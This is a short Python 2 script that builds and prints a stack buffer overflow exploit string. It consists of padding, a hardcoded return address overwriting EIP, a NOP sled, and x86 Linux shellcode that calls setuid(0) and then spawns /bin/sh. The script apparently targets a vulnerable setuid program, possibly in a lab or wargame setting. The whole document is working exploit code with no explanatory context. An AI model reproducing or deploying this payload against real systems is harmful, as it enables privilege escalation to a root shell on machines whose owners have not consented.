nopsled = '\x90' * 320

setuid = '1\xdb\x8dC\x17\x99\xcd\x80'
bin_sh = (
    '\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08'
    '\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')

shellcode = setuid + bin_sh

padding = 'A' * 1036
eip = '\xa8\xa6\xfe\xbf'
print padding + eip + nopsled + shellcode
